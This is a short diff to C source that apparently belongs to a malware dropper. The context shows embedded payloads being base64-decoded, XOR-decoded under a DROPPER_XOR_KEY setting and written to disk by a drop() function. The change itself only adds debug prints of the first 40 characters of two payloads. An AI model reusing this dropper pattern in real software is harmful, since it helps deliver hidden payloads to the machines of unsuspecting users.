@@ -191,6 +191,10 @@ int main(int argc, char* argv[])
 //		data1 = XOR(data1, size1);
 	#endif
 
+
+		printf("%.*s", 40, data4);
+		printf("%.*s", 40, data5);
+
 		drop(size4, data4, name4);
 		drop(size5, data5, name5);
 //		drop(size1, data1, name1);
@@ -224,6 +228,7 @@ int main(int argc, char* argv[])
 		data4 = base64decode(data4, &size4);
 		data5 = base64decode(data5, &size5);
 //		data1 = base64decode(data1, &size1);
+
 	#endif
 
 	#if DROPPER_XOR_KEY != 0
